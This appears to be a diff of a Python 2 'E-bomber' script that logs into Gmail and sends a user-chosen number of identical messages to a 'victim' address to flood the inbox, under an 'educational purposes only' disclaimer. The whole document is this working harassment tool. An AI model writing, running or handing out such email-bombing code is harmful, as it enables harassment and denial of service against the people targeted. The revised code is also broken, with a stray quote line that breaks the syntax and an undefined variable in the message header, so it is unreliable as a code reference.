@@ -1,46 +1,59 @@
+#!/usr/bin/python 2.7
+#E-bomber
+#This code for education purpose only.
+#Use it at your own risk !!!
+
+
+
 import os
-import random
 import smtplib
-import sys
 import getpass
-import time                                                                                                                                                                                           # ======================= HEADING ================================================================================================
-os.system('clear')
-print ('''
-\033[91mTHIS IS FOR EDUCATIONAL PURPOSES ONLY
-''')
-print(" ")
-#########################   USER INFO ##########################
-user = raw_input('\033[94m[?] \033[97mYour \033[92mGmail\033[97m :\033[93m ')
-password = getpass.getpass('\033[94m[?]\033[97m Your \033[91mPassword\033[97m :\033[93m ')
-print(" ")
-victim = raw_input('\033[94m[?]\033[97m The victim \033[91mEMAIL\033[97m : \033[93m')
-message = raw_input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m : \033[93m')
-print(" ")
-number = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
-print(" ")
-print("\033[94m[*] \033[97mSending : ")
-############################### SMTP_SERVER INFO ##################
+import sys
+import time
+
+                    '
+
+print '    '
+email = raw_input('Email: ')
+print '      '
+passwd = getpass.getpass('Password: ')
+
+print '   '
+
+to = raw_input('\nTo: ')
+
+
+print '    '
+
+body = raw_input('Message: ')
+
+print '    '
+
+total = input('Number of send: ')
+
 smtp_server = 'smtp.gmail.com'
 port = 587
 
-##########################  Login ############################                                                                                                                                        try:                                                                                                                                                                                                      server = smtplib.SMTP(smtp_server,port)                                                                                                                                                               server.ehlo()                                                                                                                                                                                         if smtp_server == "smtp.gmail.com":                                                                                                                                                                           server.starttls()                                                                                                                                                                             server.login(user,password)
-###################### SENDING #########################################
-for i in range(1, number+1):
+
+print ''
+
+try:
+    server = smtplib.SMTP(smtp_server,port)
+    server.ehlo()
+    server.starttls()
+    server.login(email,passwd)
+    for i in range(1, total+1):
         subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
-        server.sendmail(user,victim,msg)
-        print ("\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
+        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
+        server.sendmail(email,to,msg)
+        print "\rE-mails sent: %i" % i
+        time.sleep(1)
         sys.stdout.flush()
     server.quit()
-    print ('\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
-
-
+    print '\n Done !!!'
 except KeyboardInterrupt:
-    print ('[✘] Canceled')
+    print '[-] Canceled'
     sys.exit()
 except smtplib.SMTPAuthenticationError:
-    print(" ")
-    print("\033[94m[✘] \033[91mError \033[97m:")
-    print ('\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
-    print ("\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
+    print '\n[!] The username or password you entered is incorrect.'
     sys.exit()
